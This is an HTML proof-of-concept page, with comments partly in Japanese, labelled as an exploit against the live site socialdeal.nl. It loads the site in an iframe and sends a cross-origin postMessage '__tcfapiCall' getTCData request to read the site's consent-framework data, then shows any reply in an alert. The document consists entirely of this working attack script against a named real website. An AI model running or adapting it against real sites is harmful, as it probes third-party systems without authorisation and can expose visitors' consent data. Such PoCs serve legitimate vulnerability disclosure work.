<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>__tcfapiCall PoC</title>
</head>
<body>
  <h1>PoC: __tcfapiCall Exploit on socialdeal.nl</h1>
  <iframe id="targetFrame" src="https://www.socialdeal.nl/" style="width:100%; height:300px;"></iframe>

  <script>
    const targetFrame = document.getElementById("targetFrame");
    const callId = "exploit-" + Date.now();

    // 応答受信
    window.addEventListener("message", (event) => {
      try {
        const data = JSON.parse(event.data);
        if (data.__tcfapiReturn && data.__tcfapiReturn.callId === callId) {
          console.log("✅ Received __tcfapiReturn:", data.__tcfapiReturn);
          alert("✅ __tcfapiReturn received:\n" + JSON.stringify(data.__tcfapiReturn, null, 2));
        }
      } catch (e) {
        console.warn("Not JSON:", event.data);
      }
    });

    // PoC送信
    setTimeout(() => {
      const msg = {
        __tcfapiCall: {
          command: "getTCData",
          version: 2,
          parameter: null,
          callId: callId
        }
      };
      targetFrame.contentWindow.postMessage(JSON.stringify(msg), "https://www.socialdeal.nl");
      console.log("PoC message sent:", msg);
    }, 6000);  // 5秒より少し長めがおすすめ
  </script>
</body>
</html>
